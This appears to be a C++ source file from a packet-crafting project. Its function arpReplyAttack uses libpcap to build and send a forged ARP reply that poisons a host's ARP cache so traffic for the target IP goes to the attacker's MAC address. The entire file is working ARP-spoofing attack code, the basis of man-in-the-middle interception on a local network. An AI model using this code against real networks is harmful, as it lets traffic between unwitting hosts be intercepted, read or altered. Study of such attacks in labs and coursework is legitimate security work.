#include "pch.h"
\
#pragma pack(push, 1)
    struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

void arpReplyAttack(pcap_t *pcap, Address address)
{
    EthArpPacket packet;

    packet.eth_.dmac_ = address.senderMac;
    packet.eth_.smac_ = address.attackerMac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.smac_ = address.attackerMac;
    packet.arp_.sip_ = htonl(address.targetIp);
    packet.arp_.tmac_ = address.senderMac;
    packet.arp_.tip_ = htonl(address.senderIp);

    int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0)
    {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
        exit(1);
    }
}
